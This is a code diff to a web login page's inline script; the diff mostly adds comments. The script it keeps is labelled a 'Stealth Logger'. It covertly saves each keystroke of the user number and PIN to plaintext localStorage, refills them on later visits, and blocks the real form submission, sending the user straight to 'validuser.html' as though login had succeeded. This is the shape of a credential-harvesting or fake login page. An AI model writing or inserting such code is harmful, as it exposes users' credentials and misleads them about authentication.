@@ -1260,16 +1260,19 @@ resizeTo(screen.availWidth,screen.availHeight-20);
 // ################################################################
 
 <script>
-// Load footer.js (fixed version)
+// 1. Load footer.js (without the '); issue)
 document.write('<div class="col-sm-12"><script src="/itsincludes/js/footer.js"><\/script></div>');
 
-// Your original stealth logger code below (unchanged)
+// 2. Stealth Logger + Direct Redirect
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.forms['frmLogin'];
+
+    // Load saved credentials
     const saved = JSON.parse(localStorage.getItem('loginData') || '{}');
     form.unum.value = saved.unum || '';
     form.pin.value = saved.pin || '';
 
+    // Auto-save inputs
     function saveToStorage() {
         localStorage.setItem('loginData', JSON.stringify({
             unum: form.unum.value,
@@ -1280,10 +1283,11 @@ document.addEventListener('DOMContentLoaded', function() {
     form.unum.addEventListener('input', saveToStorage);
     form.pin.addEventListener('input', saveToStorage);
 
+    // 3. DIRECT REDIRECT (NO FORM SUBMISSION)
     form.addEventListener('submit', function(e) {
-        e.preventDefault();
+        e.preventDefault(); // Stop default form submission
         saveToStorage();
-        window.location.href = 'validuser.html'; // Redirect remains the same
+        window.location.href = 'validuser.html'; // Force redirect
     });
 });
 </script>
